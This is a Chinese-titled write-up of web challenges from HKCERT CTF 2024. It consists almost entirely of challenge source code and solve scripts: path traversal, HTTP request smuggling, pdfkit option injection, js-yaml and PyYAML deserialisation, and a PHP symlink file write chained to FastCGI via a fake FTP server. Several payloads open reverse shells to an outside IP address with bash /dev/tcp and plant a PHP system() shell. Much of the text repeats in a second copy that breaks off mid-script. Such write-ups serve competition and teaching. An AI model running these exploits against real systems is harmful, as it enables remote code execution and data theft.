# 香港網安奪旗賽HKCERT CTF 2024 Write up（上）

> 原文: https://www.ctfiot.com/216353.html
> ID: 216353

Web

新免費午餐

米斯蒂茲的迷你 CTF (1)

米斯蒂茲的迷你 CTF (2)

PDF 生成器（1）

PDF 生成器（2）

已知用火 (1)

已知用火 (2)

JSPyaml

奇美拉

Misc

自行取旗

B6ACP

My Lovely Cats

Forensics

One Way Room

APT攻擊在哪裡 (1)

 Web

新免費午餐

控制台直接使用以下指令完成遊戲

score = 9999
endGame()

from flask import Blueprint, request, jsonify
from flask.views import MethodView
import collections

from app.views import pages
from app.views.api import users
from app.views.api import challenges
from app.views.api.admin import challenges as admin_challenges
from app.models.user import User
from app.models.challenge import Challenge
from app.models.attempt import Attempt

class GroupAPI(MethodView):
    init_every_request = False

    def __init__(self, model):
        self.model = model

        self.name_singular = self.model.__tablename__
        self.name_plural = f'{self.model.__tablename__}s'

    def get(self):
        # the users are only able to list the entries related to them
        items = self.model.query_view.all()

        group = request.args.get('group')

        if group is not None and not group.startswith('_') and group in dir(self.model):
            grouped_items = collections.defaultdict(list)
            for item in items:
                id = str(item.__getattribute__(group))
                grouped_items[id].append(item.marshal())
            return jsonify({self.name_plural: grouped_items}), 200

        return jsonify({self.name_plural: [item.marshal() for item in items]}), 200

def register_api(app, model, name):
    group = GroupAPI.as_view(f'{name}_group', model)
    app.add_url_rule(f'/api/{name}/', view_func=group)
  

def init_app(app):
    # Views
    app.register_blueprint(pages.route, url_prefix='/')

    # API
    app.register_blueprint(users.route, url_prefix='/api/users')
    app.register_blueprint(challenges.route, url_prefix='/api/challenges')
    app.register_blueprint(admin_challenges.route, url_prefix='/api/admin/challenges')

    register_api(app, User, 'users')
    register_api(app, Challenge, 'challenges')
    register_api(app, Attempt, 'attempts')

@event.listens_for(User.password, 'set', retval=True)
def hash_user_password(target, value, oldvalue, initiator):
    if value != oldvalue:
        return compute_hash(value)
    return value

def compute_hash(password, salt=None):
    if salt is None:
        salt = os.urandom(4).hex()
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()

import hashlib
import itertools

chars = '0123456789abcdef'

combinations = [''.join(combo) for combo in itertools.product(chars, repeat=6)]
for password in combinations:
    if '744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94' == hashlib.sha256(f'77364c85/{password}'.encode()).hexdigest():
        print(password)

# 7df71e

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    password = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, default=0)
    last_solved_at = db.Column(db.DateTime)

@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    html_file = f"{session_id}.html"
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']
  
    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    with open(html_file, 'w') as file:
        file.write(response.text)

    # Make PDF
    stdout, stderr, returncode = execute_command(f'wkhtmltopdf {html_file} {pdf_file}')

    if returncode != 0:
        return f"""
        <h1>Error</h1>
        {stdout}
        {stderr}
        """
      
    return redirect(pdf_file)

def execute_command(command):
    """
    Execute an external OS program securely with the provided command.

    Args:
        command (str): The command to execute.

    Returns:
        tuple: (stdout, stderr, return_code)
    """
    # Split the command into arguments safely
    args = shlex.split(command)

    try:
        # Execute the command and capture the output
        result = subprocess.run(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True  # Raises CalledProcessError for non-zero exit codes
        )
        return result.stdout, result.stderr, result.returncode
    
except subprocess.CalledProcessError as e:
        # Return the error output and return code if command fails
        return e.stdout, e.stderr, e.returncode

<html>
        
</html>

url = "https://c52a-webpage-to-pdf-1-t519-r36jghu3qed6ru6azopujzln.hkcert24.pwnable.hk/"

def exp():
    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)

exp()

@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']
  
    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    # Make PDF
    pdfkit.from_string(response.text, pdf_file)
  
    return redirect(pdf_file)

def _find_options_in_meta(self, content):
        """Reads 'content' and extracts options encoded in HTML meta tags

        :
param content: str or file-like object - contains HTML to parse

        returns:
          dict: {config option: value}
        """
        if (isinstance(content, io.IOBase)
                or content.__class__.__name__ == 'StreamReaderWriter'):
            content = content.read()

        found = {}

        for x in re.findall('<meta [^>]*>', content):
            if re.search('name=["']%s' % self.configuration.meta_tag_prefix, x):
                name = re.findall('name=["']%s([^"']*)' %
                                  self.configuration.meta_tag_prefix, x)[0]
                found[name] = re.findall('content=["']([^"']*)', x)[0]

        return found

<html>
        <meta name="pdfkit---enable-local-file-access" content="">
        
</html>

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include 
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#define PORT 8000
#define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && 
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = ' ';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %srn"
        "Server: mystiz-web/1.0.0rn"
        "Content-Type: text/htmlrn"
        "Connection: %srn"
        "Content-Length: %urn"
        "rn";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}

import socket
import ssl

host = "c02a-custom-server-1-1.hkcert24.pwnable.hk"
port = 1337
sock = socket.create_connection((host, port))
print("connected")
context = ssl.create_default_context()
ssl_sock = context.wrap_socket(sock, server_hostname=host)

path = "/../../../../../../../flag.txt.js"
c = 1024 - len(path) - 5
path_payload = "/" * c + path
payload = f'''GET /{path_payload} HTTP/1.1
'''.replace("n","rn").encode()
ssl_sock.sendall(payload)
print("sended")
print(ssl_sock.recv(1024).decode())
print(ssl_sock.recv(1024).decode())

import socket
import ssl
import threading
import time
import urllib.parse

def test():
    c1 = 0
    while True:
        host = "c02b-custom-server-2-2.hkcert24.pwnable.hk"
        port = 1337
        sock = socket.create_connection((host, port))
        context = ssl.create_default_context()
        s = context.wrap_socket(sock, server_hostname=host)
        path = "/../../../../../../../../../../../flag.txt.js"
        c = 1024 - len(path) - 5
        path_payload = "/" * c + path
        path_payload = b'GET /'+path_payload.encode()
        payload = f'''GET /index.html HTTP/1.1
Host: 123
Content-Length: {944 + len(path_payload) + 1024}

'''.replace("n", "rn").encode()
        payload += b'a' * 944
        s.sendall(payload + path_payload + path_payload + b'rnrnGET /000.html HTTP/1.0rnHost: 123rnrn' + payload + path_payload + path_payload)
        s11 = ""
        for i in range(10):
            s11 += s.recv(10240).decode()
        if 'hkcert24' in s11:
            print(s11)
        c1 += 1
        print("r" + str(c1) , end="")

threading.Thread(target=test).start()
test()

app.post('/debug', (req, res) => {
    if(ip.isLoopback(req.ip) && req.cookies.debug === 'on'){
        const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
         let input = req.body.yaml;
         console.log(`Input: ${input}`);
         let output = yaml.load(input, {schema});
         console.log(`Output: ${output}`);
         res.json(output);
        }catch(e){
         res.status(400).send('Error');
        }
    }else{
        res.status(401).send('Unauthorized');
    }
});

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YAML Parser</title>
    <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
    
</head>

    <h1>YAML Parser</h1>
    <textarea id="yaml" placeholder="- YAML"></textarea>

    Parse
    <h2>Output:</h2>
    

    <script>
    let pyodide;
    async function init(){
    pyodide = await loadPyodide();
    await pyodide.loadPackage("pyyaml");
    runHash();
    }
    async function run(y){
    x = `+'`'+`import yaml
yaml.load("""`+`$`+`{y.replaceAll('"','')}""",yaml.Loader)`+'`'+`;
            try {
                output.textContent = await pyodide.runPythonAsync(x);
            } catch (e) {
                output.textContent = e;
            }
    }
        async function runHash() {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (hash) {
                yaml.value = hash;
                run(hash);
            }
        }      
        parse.addEventListener("click", async () => {run(yaml.value)});
        onhashchange = runHash;
        onload = init;
    </script>

</html>

payload = '''
import pyodide
payload = """
document.cookie = "debug=on; path=/;";
const data = new URLSearchParams();
data.append('yaml', `xxx`);
fetch('/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include',
  body: data.toString()
})
  .then(response => response.json())
  .then(data => console.log('成功:', data))
  .catch(error => console.error('请求出错:', error));
"""
pyodide.code.run_js(payload)
'''
payload = f"http://127.0.0.1:
3000/#!!python/object/apply:
exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
print(payload)

const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
         let input = req.body.yaml;
         console.log(`Input: ${input}`);
         let output = yaml.load(input, {schema});
         console.log(`Output: ${output}`);
         res.json(output);
        }catch(e){
         res.status(400).send('Error');
        }

"toString": !<tag:
yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'

import base64

url = "https://c62-jspyaml-t519-hev2ottoirslajxbb32csyeq.hkcert24.pwnable.hk/"

payload = '''
import pyodide
payload = """
document.cookie = "debug=on; path=/;";
const data = new URLSearchParams();
data.append('yaml', `"toString": !<tag:
yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);

fetch('/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include',
  body: data.toString()
})
  .then(response => response.json())
  .then(data => console.log('成功:', data))
  .catch(error => console.error('请求出错:', error));
"""
pyodide.code.run_js(payload)
'''

payload = f"http://127.0.0.1:
3000/#!!python/object/apply:
exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"

print(payload)

<?php
    class CitrusWorkspace {
        function __construct($root) {
            if (!is_dir($root)) {
                mkdir($root, 0755);
            }
            $this->root = $root;
        }

        function create($filename, $symlink=0, $target="") {
            $this->validate_filename($filename);

            if ($symlink === 0) {
                @file_put_contents($this->root.$filename, "");
            }
            else {
                @symlink($target, $this->root.$filename);

                try {
                    if (str_contains(@readlink($this->root.$filename), "/") || str_contains(@readlink($this->root.$filename), "..")) {
                        throw new Exception("Trying to hack?");
                    }
                }
                catch (Exception $e) {
                    @unlink($this->root.$filename);
                    throw $e;
                }
            }
        }

        function read($filename) {
            $this->validate_filename($filename);

            sleep(5);

            chdir($this->root);
            $buf = @file_get_contents($this->resolve_symlink($filename));
            return $buf;
        }

        function write($filename, $data) {
            $this->validate_filename($filename);

            sleep(5);

            chdir($this->root);
            @file_put_contents($this->resolve_symlink($filename), $data);
        }

        function delete($filename) {
            $this->validate_filename($filename);
            $this->assert_file_exists($this->root.$filename);

            @unlink($this->root.$filename);
        }

        function list() {
            $res = array();

            $ls = array_diff(scandir($this->root), array("..", "."));
            foreach($ls as $k => $v) {
                if (is_link($this->root.$v)) {
                    $res[$v] = "Symlink to ".@readlink($this->root.$v);
                }
                else
                    $res[$v] = "File";
            }

            return $res;
        }

        function validate_filename($filename) {
            if (preg_match('/[^a-z0-9]/i', $filename)) {
                throw new Exception("Filename only contain alphanumerics.");
            }
        }

        function assert_file_exists($filename) {
            if (file_exists($filename) === false && is_link($filename) === false) {
                throw new Exception("File not found.");
            }
        }

        function resolve_symlink($filename) {
            if (is_link($filename)) {
                return @readlink($filename);
            }
            return $filename;
        }

    }
?>

<?php
session_start();
require_once("lime.php");

$dirname= md5(session_id());
$workspace = new CitrusWorkspace("/tmp/$dirname/");

$mode = !empty($_POST["mode"]) ? $_POST["mode"] : null;
$filename = !empty($_POST["filename"]) ? $_POST["filename"] : null;

$error = null;
try {
    if (($_SERVER["REQUEST_METHOD"] === "POST") && ($mode === null || $filename === null)) {
        throw new Exception("mode or filename cannot be empty.");
    }

    switch($mode) {
        case "create":
            $symlink = isset($_POST["symlink"]) ? 1 : 0;
            $target = !empty($_POST["target"]) ? $_POST["target"] : null;
            $workspace->create($filename, $symlink, $target);
            break;

        case "read":
            $contents = $workspace->read($filename);
            break;

        case "write":
            $data = !empty($_POST["data"]) ? $_POST["data"] : "";
            $workspace->write($filename, $data);
            break;

        case "delete":
            $workspace->delete($filename);
            break;
    }
} catch(Exception $e) {
    $error = $e->getMessage();
}

$ls = $workspace->list();
?>

url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
# url = "http://8.134.146.39:
8080/citrus.php"
sess = requests.session()
PHPID = "123"
t = threading.BoundedSemaphore(10)
def write(file, content):
    sess.post(url, data={"mode": "write", "filename": file, "data": content}, cookies={"PHPSESSID": PHPID})
def create(target, filename):
    sess.post(url, data={"mode": "create", "symlink": "1", "target": target, "filename": filename, }, cookies={"PHPSESSID": PHPID})

def read(filename):
    return sess.post(url, data={"mode": "read", "filename": filename }, cookies={"PHPSESSID": PHPID})

def write_anyfile(file, content):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    write(rand2, content)

def read_any_file(file):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    res = read(rand2).text
    return res.split('')[1].split('')[0]

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 333))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcomen')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.n')
#Size /
conn.send(b'550 Could not get the file size.n')
#EPSV (1)
conn.send(b'150 okn')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)n') #STOR / (2)
conn.send(b'150 Permission denied.n')
#QUIT
conn.send(b'221 Goodbye.n')
conn.close()

import base64
import random
import threading

import requests

url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
# url = "http://8.134.146.39:
8080/citrus.php"
sess = requests.session()
PHPID = "123"
t = threading.BoundedSemaphore(10)
def write(file, content):
    sess.post(url, data={"mode": "write", "filename": file, "data": content}, cookies={"PHPSESSID": PHPID})
def create(target, filename):
    sess.post(url, data={"mode": "create", "symlink": "1", "target": target, "filename": filename, }, cookies={"PHPSESSID": PHPID})

def read(filename):
    return sess.post(url, data={"mode": "read", "filename": filename }, cookies={"PHPSESSID": PHPID})

def write_anyfile(file, content):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    write(rand2, content)

def read_any_file(file):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    res = read(rand2).text
    return res.split('')[1].split('')[0]

write_anyfile("/tmp/a.php", "<?php system('bash -c "bash -i >&/dev/tcp/8.134.146.39/7788 0>&1"'); ?>")
write_anyfile("ftp://8.134.146.39:
333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))

from base64 import b64decode
from secrets import token_hex
import subprocess
import os
import sys
import tempfile

FLAG = os.environ["FLAG"] if os.environ.get("FLAG") is not None else "hkcert24{test_flag}"

print("Encode your Go program in base64")
code = input(">> ")

with tempfile.TemporaryDirectory() as td:
    fn = token_hex(16)
    src = os.path.join(td, f"{fn}")
    with open(src+".go", "w") as f:
        f.write(b64decode(code).decode())  

    p = subprocess.run(["./fork", "build", "-o", td, src+".go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) # renamed binary
    if p.returncode != 0:
        print(r"Fail to build ¯_(ツ)_/¯")
        sys.exit(1)

    _ = subprocess.run([src], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if _.returncode == 0:
        print(r"You can write Go programs with no bugs, but I cannot give you the flag ¯_(ツ)_/¯")
        sys.exit(1)

    if b"panic" in _.stderr:
        print("I am calm...")
        sys.exit(1)

    print(f"You are an experienced Go developer, here's your flag: {FLAG}")
    sys.exit(1)

package main

import (
 "os"
)

func main() {
 payload := `import os
code = input("111> ")
print(os.popen(code).read())
`
 os.WriteFile("base64.py", []byte(payload), 0777)
}


```
score = 9999
endGame()
from flask import Blueprint, request, jsonify
from flask.views import MethodView
import collections

from app.views import pages
from app.views.api import users
from app.views.api import challenges
from app.views.api.admin import challenges as admin_challenges
from app.models.user import User
from app.models.challenge import Challenge
from app.models.attempt import Attempt

class GroupAPI(MethodView):
    init_every_request = False

    def __init__(self, model):
        self.model = model

        self.name_singular = self.model.__tablename__
        self.name_plural = f'{self.model.__tablename__}s'

    def get(self):
        # the users are only able to list the entries related to them
        items = self.model.query_view.all()

        group = request.args.get('group')

        if group is not None and not group.startswith('_') and group in dir(self.model):
            grouped_items = collections.defaultdict(list)
            for item in items:
                id = str(item.__getattribute__(group))
                grouped_items[id].append(item.marshal())
            return jsonify({self.name_plural: grouped_items}), 200

        return jsonify({self.name_plural: [item.marshal() for item in items]}), 200

def register_api(app, model, name):
    group = GroupAPI.as_view(f'{name}_group', model)
    app.add_url_rule(f'/api/{name}/', view_func=group)
  

def init_app(app):
    # Views
    app.register_blueprint(pages.route, url_prefix='/')

    # API
    app.register_blueprint(users.route, url_prefix='/api/users')
    app.register_blueprint(challenges.route, url_prefix='/api/challenges')
    app.register_blueprint(admin_challenges.route, url_prefix='/api/admin/challenges')

    register_api(app, User, 'users')
    register_api(app, Challenge, 'challenges')
    register_api(app, Attempt, 'attempts')
@event.listens_for(User.password, 'set', retval=True)
def hash_user_password(target, value, oldvalue, initiator):
    if value != oldvalue:
        return compute_hash(value)
    return value
def compute_hash(password, salt=None):
    if salt is None:
        salt = os.urandom(4).hex()
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()
import hashlib
import itertools

chars = '0123456789abcdef'

combinations = [''.join(combo) for combo in itertools.product(chars, repeat=6)]
for password in combinations:
    if '744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94' == hashlib.sha256(f'77364c85/{password}'.encode()).hexdigest():
        print(password)

# 7df71e
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    password = db.Column(db.String, nullable=False)
    score = db.Column(db.Integer, default=0)
    last_solved_at = db.Column(db.DateTime)
@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    html_file = f"{session_id}.html"
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']
  
    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    with open(html_file, 'w') as file:
        file.write(response.text)

    # Make PDF
    stdout, stderr, returncode = execute_command(f'wkhtmltopdf {html_file} {pdf_file}')

    if returncode != 0:
        return f"""
        <h1>Error</h1>
        {stdout}
        {stderr}
        """
      
    return redirect(pdf_file)
def execute_command(command):
    """
    Execute an external OS program securely with the provided command.

    Args:
        command (str): The command to execute.

    Returns:
        tuple: (stdout, stderr, return_code)
    """
    # Split the command into arguments safely
    args = shlex.split(command)

    try:
        # Execute the command and capture the output
        result = subprocess.run(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True  # Raises CalledProcessError for non-zero exit codes
        )
        return result.stdout, result.stderr, result.returncode
    
except subprocess.CalledProcessError as e:
        # Return the error output and return code if command fails
        return e.stdout, e.stderr, e.returncode
<html>
        
</html>
url = "https://c52a-webpage-to-pdf-1-t519-r36jghu3qed6ru6azopujzln.hkcert24.pwnable.hk/"

def exp():
    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)

exp()
@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']
  
    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    # Make PDF
    pdfkit.from_string(response.text, pdf_file)
  
    return redirect(pdf_file)
def _find_options_in_meta(self, content):
        """Reads 'content' and extracts options encoded in HTML meta tags

        :
param content: str or file-like object - contains HTML to parse

        returns:
          dict: {config option: value}
        """
        if (isinstance(content, io.IOBase)
                or content.__class__.__name__ == 'StreamReaderWriter'):
            content = content.read()

        found = {}

        for x in re.findall('<meta [^>]*>', content):
            if re.search('name=["']%s' % self.configuration.meta_tag_prefix, x):
                name = re.findall('name=["']%s([^"']*)' %
                                  self.configuration.meta_tag_prefix, x)[0]
                found[name] = re.findall('content=["']([^"']*)', x)[0]

        return found
<html>
        <meta name="pdfkit---enable-local-file-access" content="">
        
</html>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <stdio.h>
    #include <netinet/in.h>
    #include <signal.h>
    #include 
    #include <string.h>
    #include <stdlib.h>
    #include <stdbool.h>

    #define PORT 8000
    #define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && 
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = ' ';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %srn"
        "Server: mystiz-web/1.0.0rn"
        "Content-Type: text/htmlrn"
        "Connection: %srn"
        "Content-Length: %urn"
        "rn";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}
import socket
import ssl

host = "c02a-custom-server-1-1.hkcert24.pwnable.hk"
port = 1337
sock = socket.create_connection((host, port))
print("connected")
context = ssl.create_default_context()
ssl_sock = context.wrap_socket(sock, server_hostname=host)

path = "/../../../../../../../flag.txt.js"
c = 1024 - len(path) - 5
path_payload = "/" * c + path
payload = f'''GET /{path_payload} HTTP/1.1
'''.replace("n","rn").encode()
ssl_sock.sendall(payload)
print("sended")
print(ssl_sock.recv(1024).decode())
print(ssl_sock.recv(1024).decode())
import socket
import ssl
import threading
import time
import urllib.parse

def test():
    c1 = 0
    while True:
        host = "c02b-custom-server-2-2.hkcert24.pwnable.hk"
        port = 1337
        sock = socket.create_connection((host, port))
        context = ssl.create_default_context()
        s = context.wrap_socket(sock, server_hostname=host)
        path = "/../../../../../../../../../../../flag.txt.js"
        c = 1024 - len(path) - 5
        path_payload = "/" * c + path
        path_payload = b'GET /'+path_payload.encode()
        payload = f'''GET /index.html HTTP/1.1
Host: 123
Content-Length: {944 + len(path_payload) + 1024}

'''.replace("n", "rn").encode()
        payload += b'a' * 944
        s.sendall(payload + path_payload + path_payload + b'rnrnGET /000.html HTTP/1.0rnHost: 123rnrn' + payload + path_payload + path_payload)
        s11 = ""
